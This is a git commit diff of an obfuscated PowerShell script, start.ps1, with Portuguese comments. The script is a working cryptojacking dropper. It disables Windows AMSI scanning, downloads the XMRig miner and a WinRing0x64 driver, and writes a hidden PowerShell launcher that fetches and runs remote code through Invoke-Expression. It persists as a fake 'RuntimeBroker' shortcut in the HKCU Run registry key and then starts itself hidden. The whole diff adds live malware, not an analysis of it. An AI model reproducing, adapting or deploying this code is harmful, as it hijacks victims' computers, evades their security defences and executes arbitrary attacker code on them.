2613cc751c078b3aad4d871ae74f0555aeddfc31
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-08-29 20:26:57 -0300

    Update start.ps1

--- start.ps1
+++ start.ps1
@@ -3,104 +3,106 @@ ${as`semB`lY} = [Ref]."a`s`seMBLY".('Ge'+'tTyp'+'e').Invoke(('{0}m{1}{2}' -f ${W
 ${fi`e`ld} = ${As`sE`MBlY}.('G'+'etField').Invoke(('am{0}InitFailed' -f ${C}),('Non'+'P'+'ublic'+',St'+'a'+'tic'))
 ${fIE`ld}.('SetVa'+'lu'+'e').Invoke(${N`UlL},${tR`Ue})
 
-if (&('Tes'+'t'+'-Path') -Path "$env:APPDATA\Microsoft\2504706.txt") {
+# Defina o URL e o caminho para o arquivo zip
+if (.('Tes'+'t-P'+'ath') -Path "$env:APPDATA\Microsoft\2504706.txt") {
     exit
 } else {
-    ${2504} = "$env:APPDATA\Microsoft\2504706.txt"
-    ${u`RL} = ('ht'+'t'+'p'+'s'+'://'+'githu'+'b.c'+'om/'+'x'+'m'+'ri'+'g/xmr'+'ig/rel'+'eas'+'es/d'+'ow'+'nload/v6.21.'+'3/x'+'mrig-6.21.3-m'+'svc-win'+'6'+'4.zip')
-    ${bA`sepa`Th} = &('J'+'oin-Pa'+'t'+'h') -Path ${ENV:lOc`A`l`ApPData} -ChildPath ('C'+'TF')
-    ${Zi`PP`AtH} = .('Join-P'+'at'+'h') -Path ${bA`Se`P`ATH} -ChildPath ('xmrig-6.21.3-msvc-w'+'i'+'n'+'6'+'4.zip')
-    ${Ext`Rac`Tp`ATh} = .('Join-'+'P'+'ath') -Path ${ba`SEpA`Th} -ChildPath ('xm'+'ri'+'g'+'-6.21.3')
-    ${DE`S`TINa`TioNP`Ath} = ${BA`sEPA`TH}
-    ${X`MrIGPa`TH} = .('Joi'+'n'+'-Path') -Path ${d`esTiN`A`TIOnPa`TH} -ChildPath ('xmrig'+'.exe')
-    ${Ba`TCHPA`Th} = .('Joi'+'n-P'+'ath') -Path ${b`A`sep`ATH} -ChildPath ('Runti'+'meBroker.'+'p'+'s'+'1')
-    ${SHO`RtC`UTPa`Th} = .('Joi'+'n-P'+'a'+'th') -Path "$env:APPDATA\Microsoft\" -ChildPath ('R'+'un'+'timeB'+'roker'+'.'+'lnk')
-    ${u`RI2} = (('QU6http'+'s'+'://ra'+'w.'+'gi'+'t'+'h'+'ub'+'userconte'+'nt.'+'com/so2'+'51/ola'+'que'+'ri'+'da/main/'+'fi'+'le.ps'+'1'+'Q'+'U'+'6')  -cREpLaCE([CHAR]81+[CHAR]85+[CHAR]54),[CHAR]34)
-    ${Ba`TCHcon`T`EnT} = ('echo'+' '+'5'+'216612'+' '+'> '+"$2504`n "+'po'+'wershe'+'l'+'l '+'-w'+'i'+'nd'+'owstyle '+'hid'+'den '+'-Com'+'ma'+'nd '+(('8RbIn'+'voke-Expres'+'s'+'io'+'n ')-RePLAcE ([cHar]56+[cHar]82+[cHar]98),[cHar]39)+'('+'Invok'+'e-'+'Rest'+'Method '+'-'+'Uri '+"$uri2)' "+'')
+    ${2`504} = "$env:APPDATA\Microsoft\2504706.txt"
+    ${u`RL} = ('https:/'+'/git'+'hu'+'b'+'.com/xmrig'+'/xmrig/'+'re'+'l'+'eases/download/'+'v6'+'.2'+'1'+'.'+'3/'+'xmrig-'+'6.21.3-msvc-'+'win6'+'4.z'+'ip')
+    ${bAs`EpA`Th} = .('Jo'+'in-'+'Path') -Path ${e`Nv:loC`A`lAPpD`AtA} -ChildPath ('C'+'TF')
+    ${Z`Ip`PAtH} = .('J'+'o'+'in-Path') -Path ${bA`s`E`PAtH} -ChildPath ('xmri'+'g-6.21.3-m'+'svc-w'+'i'+'n64.z'+'ip')
+    ${eX`T`R`AcTpAth} = &('Join-'+'P'+'ath') -Path ${bas`E`pATH} -ChildPath ('x'+'mrig'+'-6.'+'21.3')
+    ${d`EstinAt`IoN`p`AtH} = ${BASep`A`Th}
+    ${xmR`IgpA`Th} = &('J'+'oin-Pa'+'th') -Path ${de`stI`N`AtIoNP`ATh} -ChildPath ('xm'+'rig.exe')
+    ${b`AT`c`hpAth} = &('Joi'+'n-P'+'ath') -Path ${BA`se`pA`Th} -ChildPath ('RuntimeBro'+'k'+'er.'+'p'+'s1')
+    ${bAtC`h`ARGu`MENt} = ('-'+'Exec'+'uti'+'o'+'nP'+'olicy by'+'pa'+'ss -F'+'ile') + "" + ${baT`ChPA`Th}
+    ${shoR`TC`Utp`ATH} = &('Join-'+'Path') -Path "$env:APPDATA\Microsoft\" -ChildPath ('Run'+'timeBro'+'ker.ln'+'k')
+    ${uR`i2} = (('{'+'0'+'}https://'+'raw.g'+'ith'+'u'+'b'+'user'+'cont'+'e'+'nt'+'.c'+'o'+'m/so'+'2'+'51/olaq'+'ue'+'r'+'i'+'da/main/file.ps1{0}')  -f [chAR]34)
+    ${b`ATCHc`oNTENt} = ('ec'+'ho '+'5216612'+' '+'> '+"$2504`n "+'powershe'+'ll'+' '+'-w'+'indow'+'s'+'tyle '+'hi'+'dden '+'-Co'+'mmand'+' '+('{0'+'}I'+'nvoke-Ex'+'pr'+'ession ')  -F[Char]39+'(Invoke-Rest'+'M'+'e'+'tho'+'d '+'-'+'Uri '+"$uri2)' "+'')
 
-    
-    if (-not (&('Test'+'-'+'Pat'+'h') -Path ${BaS`e`paTh})) {
-        .('New-It'+'em') -Path ${BaSE`P`ATh} -ItemType ('Di'+'rector'+'y') | .('Out-'+'Nul'+'l')
-
-    } else {
-
-    }
-
-    
-    &('In'+'vo'+'ke-We'+'bRequest') -Uri ${U`RL} -OutFile ${zIp`pATH}
-
-    
-    &('E'+'xp'+'a'+'nd-Archive') -Path ${ZIPP`A`TH} -DestinationPath ${BAse`p`ATh}
-
-    
-    ${sOu`R`CEfiLE} = .('Join-P'+'a'+'th') -Path ${e`Xtrac`TPAth} -ChildPath ('xm'+'rig.ex'+'e')
-
-    
-    if (.('Test-P'+'at'+'h') -Path ${sO`UrC`e`FIlE}) {
-        
-        &('Mo'+'ve-I'+'tem') -Path ${soUR`CE`FiLE} -Destination ${DesTin`AtI`O`N`pA`Th}
+    # Verifique se a pasta base existe; se não, crie-a
+    if (-not (&('Te'+'st-'+'Path') -Path ${basEpa`Th})) {
+        &('N'+'ew-It'+'em') -Path ${b`ASePa`Th} -ItemType ('Dir'+'e'+'ctory') | .('Out'+'-'+'Null')
 
     } else {
 
     }
 
-    
-    if (&('Test-'+'Pa'+'th') -Path ${zi`p`patH}) {
-        .('Re'+'mov'+'e-Item') -Path ${ZI`pPA`TH} -Force
+    # Baixe o arquivo zip
+    &('Inv'+'ok'+'e'+'-WebRequest') -Uri ${u`RL} -OutFile ${z`ipp`ATH}
+
+    # Extraia o conteúdo do arquivo zip
+    &('Expand-'+'Arch'+'iv'+'e') -Path ${ZI`PPATh} -DestinationPath ${base`P`ATh}
+
+    # Defina o caminho do arquivo executável que você deseja mover
+    ${SOuRC`e`F`ILe} = &('Join-Pat'+'h') -Path ${EX`TrAcTp`A`TH} -ChildPath ('xm'+'ri'+'g.e'+'xe')
+
+    # Verifique se o arquivo existe
+    if (.('T'+'est'+'-Path') -Path ${SoURC`e`Fi`LE}) {
+        # Mova o arquivo para o novo local
+        .('Move-'+'Item') -Path ${S`o`UrceFi`le} -Destination ${DeSTI`Na`TI`o`NPath}
+
+    } else {
+
+    }
+
+    # Remova o arquivo zip
+    if (.('T'+'est-Pat'+'h') -Path ${ZIpp`Ath}) {
+        .('Re'+'move-Ite'+'m') -Path ${ZIP`PAtH} -Force
 
     } else {
  
     }
 
-    
-    if (&('T'+'est-Path') -Path ${E`xtRAc`Tpa`Th}) {
-        &('Remove'+'-I'+'t'+'em') -Path ${ExtRa`c`T`PAth} -Recurse -Force
+    # Remova a pasta extraída
+    if (.('Test-'+'P'+'ath') -Path ${EXT`R`ActP`ATH}) {
+        &('R'+'emove-'+'I'+'tem') -Path ${EXt`RACT`pa`TH} -Recurse -Force
    
     } else {
     
     }
 
-    
-    &('In'+'voke-R'+'estMe'+'thod') -Uri ('https://'+'github.com/s'+'o'+'25'+'1/olaquerida/rel'+'eas'+'es/d'+'ownlo'+'ad/1releasa'+'e/co'+'nfig.j'+'son') -OutFile "$basePath\config.json"
-    &('In'+'voke-'+'Re'+'stM'+'ethod') -Uri ('htt'+'ps:'+'//github.com/so251/'+'o'+'la'+'querida/r'+'eleases'+'/do'+'wnload/1rel'+'easa'+'e/W'+'inRing0x'+'64.sys') -OutFile "$basePath\WinRing0x64.sys"
+    # Baixar arquivos adicionais
+    .('I'+'nv'+'ok'+'e-RestMethod') -Uri ('https'+'://git'+'hub.co'+'m/s'+'o251/olaq'+'u'+'er'+'ida/re'+'lea'+'ses'+'/dow'+'nloa'+'d/1rele'+'asa'+'e/'+'c'+'on'+'fig.'+'jso'+'n') -OutFile "$basePath\config.json"
+    .('In'+'vo'+'ke-'+'Re'+'stM'+'ethod') -Uri ('https://github.'+'co'+'m'+'/'+'so251/o'+'laqueri'+'da/re'+'leases/download'+'/1rel'+'ea'+'sae/WinRing0x6'+'4'+'.s'+'ys') -OutFile "$basePath\WinRing0x64.sys"
 
-    
-    &('Ne'+'w-I'+'tem') -Path "$batchPath" -ItemType ('Fi'+'le')
-    &('S'+'et-'+'Conte'+'nt') -Path ${BatcHp`A`Th} -Value ${b`A`TcHcO`NTEnt}
+    # Crie o script batch para iniciar o xmrig.exe
+    .('New-'+'Ite'+'m') -Path "$batchPath" -ItemType ('Fi'+'le')
+    &('S'+'et-C'+'ontent') -Path ${B`ATcH`PaTH} -Value ${bA`Tc`H`cOnTEnT}
 
-    
-    function C`REATE-S`hOrtCuT {
+    # Função para criar um atalho
+    function C`ReatE-sH`o`RtC`UT {
         param (
-            [string]${TargE`Tpa`Th} = "",
-            [string]${sHo`Rt`c`UTPatH},
-            [string]${wORKING`DIRe`c`T`ory} = "",
-            [string]${a`Rg`U`MEnts} = "",
-            [string]${iCoN`l`O`CAtiON} = "",
-            [string]${De`S`crip`TiON} = ""
+            [string]${ta`RGeTp`ATH} = "",
+            [string]${s`Ho`Rt`cuTpaTH},
+            [string]${WOR`kI`NGdI`ReC`To`Ry} = "",
+            [string]${Arg`UM`E`NTS} = "",
+            [string]${ICoNL`O`caTioN} = "",
+            [string]${dES`cRiPt`I`on} = ""
         )
 
-        ${wSH`sHE`Ll} = .('New-O'+'bje'+'ct') -ComObject ('WScript'+'.Sh'+'ell')
-        ${Sh`OrtC`Ut} = ${wsh`ShELl}.('Cre'+'a'+'teSh'+'ortc'+'ut').Invoke(${s`HoRt`cutpa`TH})
-        ${S`hoRT`C`UT}."taRgetp`A`TH" =  ${TArGE`T`paTh}
-        ${shO`Rt`cUt}."Arg`Ume`NTS" = ${ARGU`Men`Ts}
-        ${ShoR`T`cut}."WOrkING`dire`c`To`RY" = ${W`oRk`InGdi`REct`O`RY}
-        ${sH`OR`Tcut}."icONl`OC`ATiON" = ${IC`ONloc`A`Tion}
-        ${SHor`TC`UT}."dEs`CriPt`IOn" = ${d`e`sCr`iptION}
-        ${S`H`oRTCUT}."Wi`N`dOWSTyle" = 7  
-        ${Sho`R`TCuT}.('S'+'ave').Invoke()
+        ${W`sh`sh`eLL} = &('N'+'ew-Obje'+'c'+'t') -ComObject ('WSc'+'r'+'ipt.'+'S'+'hell')
+        ${s`hO`Rt`CuT} = ${wShS`h`eLl}.('Create'+'S'+'ho'+'rt'+'cut').Invoke(${S`hORtCUtp`Ath})
+        ${sh`oR`T`cut}."t`A`RgetPAth" =  ${t`ARGEtp`Ath}
+        ${shO`RT`cUT}."Arg`UmenTS" = ${AR`G`U`meNTs}
+        ${sHor`T`Cut}."Wor`KInGdI`R`E`C`TORy" = ${wOrKING`d`Ir`e`CtORy}
+        ${sh`oRtcUT}."i`co`NLOCatioN" = ${IcOnl`ocAT`I`On}
+        ${sHoRt`cUT}."dEsC`RipT`iOn" = ${dESc`RIp`T`ION}
+        ${SHoR`T`cuT}."W`I`N`doWSTyLE" = 7  # 7 = Minimizada
+        ${sHO`R`TCuT}.('Sav'+'e').Invoke()
     }
 
-    
-    
-    ${i`Co`NlOcatIon} = ("$SystemRoot\System32\shell32.dll, "+'0')  
-    ${DeS`cri`P`Tion} = ('Run'+'ti'+'me B'+'ro'+'ker')
+    # Crie um atalho para o script batch
+    # Defina o caminho para o ícone padrão e a descrição
+    ${i`cOnLoC`AtiOn} = ("$SystemRoot\System32\shell32.dll, "+'0')  # Exemplo de ícone padrão
+    ${dEs`cr`IPTIOn} = ('R'+'u'+'nti'+'me Broker')
 
 
-    .('Cre'+'at'+'e-Shortcut') -TargetPath (('C:YwKWindows'+'YwKS'+'ystem3'+'2'+'YwKWindowsPower'+'ShellY'+'wKv1.'+'0Yw'+'Kpowe'+'rshell.e'+'x'+'e') -crepLaCE  ([CHar]89+[CHar]119+[CHar]75),[CHar]92) -ShortcutPath ${shOrtc`UtP`AtH} -IconLocation ${I`CO`NLOC`AtioN} -Description ${dE`SC`R`IptION} -Arguments ${batC`h`paTH}
+    &('Create-Sh'+'ort'+'c'+'ut') -TargetPath (('C'+':{0'+'}Win'+'do'+'ws'+'{0}Sy'+'stem32{0}WindowsPowerShe'+'ll{0}v1.0{0}pow'+'ershell.ex'+'e')  -f  [cHAr]92) -ShortcutPath ${SHortCut`PA`TH} -IconLocation ${ICONL`O`cAtIoN} -Description ${DEScR`iP`TIon} -Arguments ${baTCH`A`RG`UmENT}
 
-    
-    .('Se'+'t-Item'+'Propert'+'y') -Path (('H'+'KC'+'U:'+'{0}Software'+'{0'+'}Mic'+'r'+'os'+'of'+'t{0}Windo'+'w'+'s{0}C'+'urre'+'n'+'tV'+'ersio'+'n{0}Run')-f[ChAr]92) -Name ('Runt'+'imeBro'+'ker') -Value "`"$shortcutPath`""
+    # Adicione o atalho ao registro para iniciar com o Windows
+    &('Set-Ite'+'mPr'+'ope'+'rt'+'y') -Path (('HKCU:{0}Software{0}'+'Micro'+'s'+'oft{0}'+'Wi'+'n'+'dows{'+'0}Curre'+'ntVer'+'sio'+'n{0}R'+'un')-F  [cHAr]92) -Name ('R'+'untime'+'Broker') -Value "`"$shortcutPath`""
 
-    &('Star'+'t-Pro'+'ce'+'ss') -FilePath "`"$shortcutPath`"" -WindowStyle ('Hidd'+'en')
+    .('Sta'+'rt-'+'Pro'+'cess') -FilePath "`"$shortcutPath`"" -WindowStyle ('H'+'idden')
 
 }
